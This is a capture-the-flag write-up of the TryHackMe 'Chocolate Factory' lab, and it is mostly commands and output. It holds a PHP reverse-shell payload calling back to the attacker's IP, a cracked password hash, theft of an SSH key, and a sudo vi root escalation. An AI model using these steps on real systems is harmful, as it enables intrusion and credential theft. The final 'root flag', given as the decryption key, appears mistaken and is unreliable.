# Room: Chocolate factory

## General Info
- **Room link:** [Chocolate factory](https://tryhackme.com/room/chocolatefactory


## Description

This room was designed so that hackers can revisit the Willy Wonka's Chocolate Factory and meet Oompa Loompa

## Provided Files / Links
- [x] Target Machine IP (10.10.147.150)

## Enumeration / Recon

- Port Enumeration:
`nmap -sV -sC -Pn 10.10.147.150 -T5`

```
PORT    STATE SERVICE    VERSION
21/tcp  open  ftp        vsftpd 3.0.3
22/tcp  open  ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http       Apache httpd 2.4.29 ((Ubuntu))
100/tcp open  newacct?
106/tcp open  pop3pw?
109/tcp open  pop2?
110/tcp open  pop3?
111/tcp open  rpcbind?
113/tcp open  ident?
119/tcp open  nntp?
125/tcp open  locus-map?
```

- Directory Enumeration

`gobuster dir -u http://10.10.147.150 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-files.txt -t 10`

```
/index.html           (Status: 200) [Size: 1466]
/home.php             (Status: 200) [Size: 569]
/.htaccess            (Status: 403) [Size: 278]
/.                    (Status: 200) [Size: 1466]
/.html                (Status: 403) [Size: 278]
/.php                 (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/validate.php         (Status: 200) [Size: 93]
/.htm                 (Status: 403) [Size: 278]
/.htpasswds           (Status: 403) [Size: 278]
/.htgroup             (Status: 403) [Size: 278]
/wp-forum.phps        (Status: 403) [Size: 278]
/.htaccess.bak        (Status: 403) [Size: 278]
/.htuser              (Status: 403) [Size: 278]
/.htc                 (Status: 403) [Size: 278]
/.ht                  (Status: 403) [Size: 278]
/index.php.bak        (Status: 200) [Size: 273]
/.htaccess.old        (Status: 403) [Size: 278]
/.htacess             (Status: 403) [Size: 278]
```

I then went to /home.php and notice that there was an input field named "command".

I typed 'ls' and got a `key_rev_key` response.

I accessed /key_rev_key and downloaded the key. Then I used strings to find plain text information:

`strings key_rev_key`: **VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=**.

---

I checked for anonymous access in the ftp port and it worked. I found a gum_room.jpg file. I didn't find anything relevant with strings, file, exiftool but I was able to extract a b64.txt file with steghide (`steghide extract -sf gum_room.jpg`).
The file is a base64 encoded text and when decoded, I got usernames and passwords:

```
daemon:*:18380:0:99999:7:::
bin:*:18380:0:99999:7:::
sys:*:18380:0:99999:7:::
sync:*:18380:0:99999:7:::
games:*:18380:0:99999:7:::
man:*:18380:0:99999:7:::
lp:*:18380:0:99999:7:::
mail:*:18380:0:99999:7:::
news:*:18380:0:99999:7:::
uucp:*:18380:0:99999:7:::
proxy:*:18380:0:99999:7:::
www-data:*:18380:0:99999:7:::
backup:*:18380:0:99999:7:::
list:*:18380:0:99999:7:::
irc:*:18380:0:99999:7:::
gnats:*:18380:0:99999:7:::
nobody:*:18380:0:99999:7:::
systemd-timesync:*:18380:0:99999:7:::
systemd-network:*:18380:0:99999:7:::
systemd-resolve:*:18380:0:99999:7:::
_apt:*:18380:0:99999:7:::
mysql:!:18382:0:99999:7:::
tss:*:18382:0:99999:7:::
shellinabox:*:18382:0:99999:7:::
strongswan:*:18382:0:99999:7:::
ntp:*:18382:0:99999:7:::
messagebus:*:18382:0:99999:7:::
arpwatch:!:18382:0:99999:7:::
Debian-exim:!:18382:0:99999:7:::
uuidd:*:18382:0:99999:7:::
debian-tor:*:18382:0:99999:7:::
redsocks:!:18382:0:99999:7:::
freerad:*:18382:0:99999:7:::
iodine:*:18382:0:99999:7:::
tcpdump:*:18382:0:99999:7:::
miredo:*:18382:0:99999:7:::
dnsmasq:*:18382:0:99999:7:::
redis:*:18382:0:99999:7:::
usbmux:*:18382:0:99999:7:::
rtkit:*:18382:0:99999:7:::
sshd:*:18382:0:99999:7:::
postgres:*:18382:0:99999:7:::
avahi:*:18382:0:99999:7:::
stunnel4:!:18382:0:99999:7:::
sslh:!:18382:0:99999:7:::
nm-openvpn:*:18382:0:99999:7:::
nm-openconnect:*:18382:0:99999:7:::
pulse:*:18382:0:99999:7:::
saned:*:18382:0:99999:7:::
inetsim:*:18382:0:99999:7:::
colord:*:18382:0:99999:7:::
i2psvc:*:18382:0:99999:7:::
dradis:*:18382:0:99999:7:::
beef-xss:*:18382:0:99999:7:::
geoclue:*:18382:0:99999:7:::
lightdm:*:18382:0:99999:7:::
king-phisher:*:18382:0:99999:7:::
systemd-coredump:!!:18396::::::
_rpc:*:18451:0:99999:7:::
statd:*:18451:0:99999:7:::
_gvm:*:18496:0:99999:7:::
charlie:$6$CZJnCPeQWp9jpNx$khGlFdICJnr8R3JCjTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/:18535:0:99999:7:::
```

I then used John the Ripper to crack the hash: `john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt charlie_hash.txt` and found **cn7824**.

---

I went back to /home.php and tested for RCE with the following payload:

`php -r '$sock=fsockopen("10.9.2.55",1337);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'`

I created a listener on my machine (`nc -nlvp 1337`) and was able to get a shell. I stabilized the shell with `python3 -c 'import pty; pty.spawn("/bin/bash")'`.

I found the user flag in charlie's home but I cannot read it yet. In his home directory, I found a 'teleport' file that contains his ssh private key.
I copied his private key in a id_rsa file in my machine and was able to login via ssh (`ssh -i id_rsa charlie@10.10.212.228`).

I was now able to read the user.txt flag: **flag{cd5509042371b34e4826e4838b522d2e}**.

---

I then checked for sudo privileges (`sudo -l`) and found:

```
(ALL : !root) NOPASSWD: /usr/bin/vi
```
I checked https://gtfobins.github.io/gtfobins/vi/ and found that I can get root access with: `sudo vi -c ':!/bin/sh' /dev/null`.

Now that I am root, I went to /root and found a root.py file:

```
from cryptography.fernet import Fernet
import pyfiglet
key=input("Enter the key:  ")
f=Fernet(key)
encrypted_mess= 'gAAAAABfdb52eejIlEaE9ttPY8ckMMfHTIw5lamAWMy8yEdGPhnm9_H_yQikhR-bPy09-NVQn8lF_PDXyTo-T7CpmrFfoVRWzlm0OffAsUM7KIO_xbIQkQojwf_unpPAAKyJQDHNvQaJ'
dcrypt_mess=f.decrypt(encrypted_mess)
mess=dcrypt_mess.decode()
display1=pyfiglet.figlet_format("You Are Now The Owner Of ")
display2=pyfiglet.figlet_format("Chocolate Factory ")
print(display1)
print(display2)
print(mess)
```

The message is encrypted with Fernet. The message is `gAAAAABfdb52eejIlEaE9ttPY8ckMMfHTIw5lamAWMy8yEdGPhnm9_H_yQikhR-bPy09-NVQn8lF_PDXyTo-T7CpmrFfoVRWzlm0OffAsUM7KIO_xbIQkQojwf_unpPAAKyJQDHNvQaJ` and the key is `-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=`. 

I then got the root flag: **-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=**.